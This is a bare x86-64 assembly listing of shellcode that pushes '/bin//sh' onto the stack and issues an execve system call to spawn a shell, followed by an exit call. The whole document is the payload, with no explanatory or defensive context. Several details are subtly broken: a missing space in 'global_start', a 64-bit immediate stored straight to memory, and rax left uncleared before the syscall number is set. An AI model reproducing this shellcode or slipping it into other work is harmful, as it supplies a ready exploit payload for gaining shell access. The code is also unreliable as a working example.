global_start

section .text
_start:
    sub     rsp, 0x18        ; 24 bytes scratch
    xor     esi, esi
    mov     qword [rsp], 0x68732f2f6e69622f   ; "/bin//sh"
    mov     qword [rsp+8], rsi                ; NUL
    lea     rdi, [rsp]
    mov     al, 59
    xor     edx, edx
    syscall

    mov     al, 60
    xor     edx, edx
    syscall
